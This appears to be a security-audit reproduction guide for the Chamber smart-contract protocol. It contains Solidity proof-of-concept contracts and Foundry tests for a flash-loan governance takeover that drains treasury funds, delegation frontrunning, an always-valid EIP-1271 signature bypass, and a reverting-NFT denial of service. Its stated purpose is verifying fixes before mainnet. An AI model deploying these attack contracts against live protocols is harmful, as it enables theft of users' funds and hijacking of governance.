# Chamber Protocol Security Reproducible Examples

## Setup Instructions

### Environment Setup
```bash
# Install dependencies
forge install

# Build contracts
forge build

# Run tests
forge test
```

### Test Accounts
- **Deployer**: 0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266
- **User1**: 0x70997970C51812dc3A010C7d01b50e0d17dc79C8
- **User2**: 0x3C44CdDdB6a900fa2b585dd299e03d12FA4293BC
- **Attacker**: 0x90F79bf6EB2c4f870365E785982E1f101E93b906

## Critical Vulnerability Reproductions

### 1. NFT Flash Loan Board Takeover

**Description**: Demonstrate how flash loans can be used to temporarily control governance

**Setup**:
```solidity
// Mock NFT contract for testing
contract MockNFT is ERC721 {
    constructor() ERC721("Mock NFT", "MNFT") {}
    function mint(address to, uint256 tokenId) external {
        _mint(to, tokenId);
    }
}

// Mock lending protocol
contract MockLender {
    mapping(uint256 => address) public ownerOf;
    mapping(uint256 => bool) public borrowed;

    function flashLoan(uint256 tokenId, address borrower, bytes calldata data) external {
        address originalOwner = ownerOf[tokenId];
        borrowed[tokenId] = true;
        // Transfer to borrower
        IERC721(address(this)).transferFrom(address(this), borrower, tokenId);

        // Execute borrower's callback
        borrower.call(data);

        // Verify return
        require(IERC721(address(this)).ownerOf(tokenId) == address(this), "NFT not returned");
        borrowed[tokenId] = false;
    }
}
```

**Attack Contract**:
```solidity
contract FlashLoanAttacker {
    Chamber public chamber;
    MockLender public lender;
    address public attacker;
    uint256 public stolenTokenId;

    function attack(uint256 tokenId) external {
        stolenTokenId = tokenId;
        attacker = msg.sender;

        // Flash loan the NFT
        bytes memory data = abi.encodeWithSignature("executeAttack()");
        lender.flashLoan(tokenId, address(this), data);
    }

    function executeAttack() external {
        // Become director by delegating
        chamber.delegate(stolenTokenId, chamber.balanceOf(attacker));

        // Execute malicious transaction (drain funds)
        address[] memory targets = new address[](1);
        uint256[] memory values = new uint256[](1);
        bytes[] memory data = new bytes[](1);

        targets[0] = attacker;
        values[0] = address(chamber).balance;
        data[0] = "";

        chamber.submitBatchTransactions(stolenTokenId, targets, values, data);

        // Confirm and execute (assuming single director for demo)
        uint256 txId = chamber.getNextTransactionId() - 1;
        chamber.confirmTransaction(stolenTokenId, txId);
        chamber.executeTransaction(stolenTokenId, txId);

        // Undelegate (return NFT ownership to lender)
        chamber.undelegate(stolenTokenId, chamber.balanceOf(attacker));
    }
}
```

**Test Case**:
```solidity
function testFlashLoanAttack() public {
    // Setup: mint NFT to lender, user deposits to chamber
    mockNFT.mint(address(mockLender), 1);
    chamber.deposit(1000 ether, user1);

    // User becomes director
    chamber.delegate(1, 1000 ether);

    // Attacker executes flash loan attack
    vm.prank(attacker);
    flashAttacker.attack(1);

    // Assert: funds drained
    assertEq(address(chamber).balance, 0);
    assertEq(attacker.balance, 1000 ether);
}
```

### 2. Delegation Frontrunning Attack

**Description**: Demonstrate MEV frontrunning of delegation transactions

**Setup**:
```solidity
contract FrontrunAttacker {
    Chamber public chamber;
    address public victim;
    uint256 public victimTokenId;
    uint256 public frontrunAmount;

    function frontrun(uint256 tokenId, uint256 amount) external payable {
        victim = msg.sender;
        victimTokenId = tokenId;
        frontrunAmount = amount + 1; // Frontrun with slightly larger amount

        // Deposit and frontrun
        chamber.deposit{value: frontrunAmount}(frontrunAmount, address(this));
        chamber.delegate(tokenId, frontrunAmount);
    }
}
```

**Test Case**:
```solidity
function testFrontrunAttack() public {
    // Setup: victim deposits and tries to delegate
    chamber.deposit(100 ether, victim);
    chamber.delegate(1, 100 ether);

    // Check victim is director
    address[] memory directors = chamber.getDirectors();
    assertEq(directors[0], victim);

    // Attacker frontruns
    vm.prank(attacker);
    frontrunAttacker.frontrun(1, 100 ether);

    // Check attacker stole position
    directors = chamber.getDirectors();
    assertEq(directors[0], attacker);
    assertTrue(chamber.getDirectors().length == 0 || directors[0] != victim);
}
```

## Medium Risk Reproductions

### 3. EIP-1271 Signature Vulnerability

**Description**: Demonstrate weak EIP-1271 signature validation

**Malicious EIP-1271 Contract**:
```solidity
contract VulnerableEIP1271 is ERC721, IERC1271 {
    address public owner;
    bytes4 constant internal MAGICVALUE = 0x1626ba7e;

    constructor(address _owner) ERC721("Vulnerable NFT", "VNFT") {
        owner = _owner;
    }

    function isValidSignature(bytes32 hash, bytes memory signature)
        external view returns (bytes4)
    {
        // VULNERABLE: Always returns valid
        return MAGICVALUE;
    }

    function transferFrom(address from, address to, uint256 tokenId) public override {
        // Allow anyone to transfer (for testing)
        _transfer(from, to, tokenId);
    }
}
```

**Test Case**:
```solidity
function testEIP1271Attack() public {
    // Setup: vulnerable contract owns NFT
    VulnerableEIP1271 vulnNFT = new VulnerableEIP1271(attacker);
    vulnNFT.mint(address(vulnNFT), 999);

    // Attacker tries to act as director
    vm.prank(attacker);
    bool isDirector = chamber.isDirector(999); // This should fail but might succeed

    // If successful, attacker can call director functions
    if (isDirector) {
        chamber.updateSeats(999, 10); // Unauthorized seat change
    }
}
```

### 4. NFT Contract Revert DoS

**Description**: Demonstrate governance DoS from malicious NFT contract

**Malicious NFT Contract**:
```solidity
contract MaliciousNFT is ERC721 {
    bool public shouldRevert;

    constructor() ERC721("Malicious NFT", "MNFT") {}

    function ownerOf(uint256 tokenId) public view override returns (address) {
        if (shouldRevert) {
            revert("Malicious revert");
        }
        return super.ownerOf(tokenId);
    }

    function triggerRevert() external {
        shouldRevert = true;
    }
}
```

**Test Case**:
```solidity
function testNFTDoS() public {
    // Setup: malicious NFT used in chamber
    MaliciousNFT maliciousNFT = new MaliciousNFT();
    maliciousNFT.mint(user1, 1);

    Chamber maliciousChamber = new Chamber();
    maliciousChamber.initialize(address(erc20), address(maliciousNFT), 5, "Test", "TST");

    // Normal operation
    address[] memory directors = maliciousChamber.getDirectors();
    assertEq(directors.length, 0); // No delegations yet

    // Trigger DoS
    maliciousNFT.triggerRevert();

    // This should handle the revert gracefully
    vm.expectRevert(); // or handle gracefully
    directors = maliciousChamber.getDirectors();
}
```

## Gas Optimization Tests

### 5. Linked List Gas Exhaustion

**Test Case**:
```solidity
function testGasExhaustion() public {
    // Setup: fill board with many small delegations
    for(uint i = 0; i < 50; i++) {
        address user = address(uint160(i + 1000));
        vm.prank(user);
        chamber.deposit(1 ether, user);
        vm.prank(user);
        chamber.delegate(i + 1, 1 ether);
    }

    // Measure gas for new delegation
    uint256 gasStart = gasleft();
    address newUser = address(uint160(2000));
    vm.prank(newUser);
    chamber.deposit(2 ether, newUser);
    vm.prank(newUser);
    chamber.delegate(100, 2 ether);
    uint256 gasUsed = gasStart - gasleft();

    console.log("Gas used for delegation:", gasUsed);
    assertLt(gasUsed, 500000); // Should not exceed reasonable limit
}
```

## Running the Tests

```bash
# Run specific test
forge test --match-test testFlashLoanAttack -v

# Run all security tests
forge test --match-contract SecurityTest -v

# Run gas profiling
forge test --gas-report --match-test testGasExhaustion
```

## Mitigation Verification

After implementing fixes, run these tests to verify:

1. **Flash Loan Protection**: Flash loan attacks should revert or be economically unviable
2. **Frontrunning Protection**: Delegation delays should prevent MEV attacks
3. **EIP-1271 Security**: Signature validation should require proper authorization
4. **NFT Error Handling**: Governance should continue functioning despite NFT issues
5. **Gas Optimization**: Board operations should scale efficiently

## Notes

- These tests demonstrate vulnerabilities that must be fixed before mainnet deployment
- All tests should pass after implementing the recommended security fixes
- Additional fuzz testing recommended for invariant validation